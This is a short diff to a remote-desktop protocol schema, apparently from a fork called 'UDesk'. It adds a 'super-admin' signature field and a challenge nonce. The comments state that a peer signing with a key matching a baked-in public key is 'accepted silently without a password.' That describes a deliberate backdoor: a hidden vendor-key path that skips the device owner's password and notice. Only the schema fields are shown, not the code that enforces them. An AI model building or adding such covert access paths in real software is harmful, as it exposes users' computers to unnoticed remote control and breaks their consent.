@@ -86,6 +86,10 @@ message LoginRequest {
   string avatar = 17;
   bytes trusted_device_v2_token = 18;
   bool trusted_device_v2_supported = 19;
+  // UDesk super-admin: ed25519 signature over (Hash.admin_challenge || target device id).
+  // When it verifies against the baked UDESK_ADMIN_PUB_KEY, the peer is accepted silently
+  // without a password. Empty for normal connections.
+  bytes admin_signature = 20;
 }
 
 message Terminal {
@@ -333,6 +337,9 @@ message CursorPosition {
 message Hash {
   string salt = 1;
   string challenge = 2;
+  // UDesk super-admin: a per-connection random nonce the controller signs with the
+  // admin private key to prove it is the super-admin (see LoginRequest.admin_signature).
+  bytes admin_challenge = 3;
 }
 
 enum ClipboardFormat {
